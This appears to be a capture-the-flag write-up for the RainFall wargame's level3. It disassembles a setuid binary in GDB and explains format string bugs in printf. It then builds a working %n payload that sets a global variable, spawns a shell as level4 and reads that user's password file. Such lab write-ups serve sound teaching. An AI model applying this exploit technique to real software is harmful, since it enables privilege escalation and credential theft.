```sh
level3@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level3 level3   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level3 level3  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level3 level3 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level4 users  5366 Mar  6  2016 level3
-rw-r--r--+ 1 level3 level3   65 Sep 23  2015 .pass
-rw-r--r--  1 level3 level3  675 Apr  3  2012 .profile
level3@RainFall:~$ ./level3
42
42
level3@RainFall:~$ ./level3 42
42
42
level3@RainFall:~$
```
There is one excutable file **level3**, it works like cat, take standard input, print them and shutting down. \
\
Run the binary file with GDB.
```sh
(gdb) info function
...
0x080484a4  v
0x0804851a  main
...
(gdb) disas v
...
   0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:    lea    -0x208(%ebp),%eax
   0x080484d2 <+46>:    mov    %eax,(%esp)
   0x080484d5 <+49>:    call   0x8048390 <printf@plt>
   0x080484da <+54>:    mov    0x804988c,%eax
   0x080484df <+59>:    cmp    $0x40,%eax
   0x080484e2 <+62>:    jne    0x8048518 <v+116>
...
```
We can find ```v()``` function which have ```fgets()``` and ```printf()```. \
and also cmp with 0x804998c and 0x40. this mean
```sh
(gdb) x/s 0x804988c
0x804988c <m>:   ""
```
```c
int	m;
if (64 == m)
{
	...
	system("/bin/sh");
}
```
So for enter in the if condition, we have to change m value with **printf vulnerability** (a.k.a format string vulnerability) [Ref](https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/). \
Format string vulnerability is simply, if printf used without formatter, we can manipulate stack.
```c
char *str;
gets(str);
printf("%s", str); // good code
printf(str); // bad code
```
If we put the argument like ```"%x %x"```, printf will be pop the stack and show us.
```sh
level3@RainFall:~$ python -c 'print "BBBB %x %x %x %x %x %x %x"' > /tmp/exploit3
level3@RainFall:~$ cat /tmp/exploit3 | ./level3
BBBB 200 b7fd1ac0 b7ff37d0 42424242 20782520 25207825 78252078
```
So we can guess our standard input is saved in 4th position of stack. \
We will replace BBBB by the address of the variable ```m```. \
Formatter ```%n``` is write number of bytes printed by ```printf```. \
Example:
```c
printf("buffer %s: %n%s", "hello", &offset, "world");
printf("%*s", offset, "bye");
```
```sh
buffer hello: world
              bye
<------------>
<align by offset>
```
So we can put specific number in the address with ```%n```, 4$ mean 4th stack address. \
First, put variable ```m``` address, so it will be seated in 4th stack and add 60 bytes of "some value" (a * 60), and write the number of bytes printed by printf (%n) which is ```address(4 bytes) + some value(60 bytes) = 64``` in the 4th (4$) address of stack, where variable ```m``` is located.
```sh
level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "a" * 60 + "%4$n"' > /tmp/exploit3
level3@RainFall:~$ cat /tmp/exploit3 - | ./level3
�aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Wait what?!
whoami
level4
cat /home/user/level4/.pass
(hidden)
```
level3 passed !
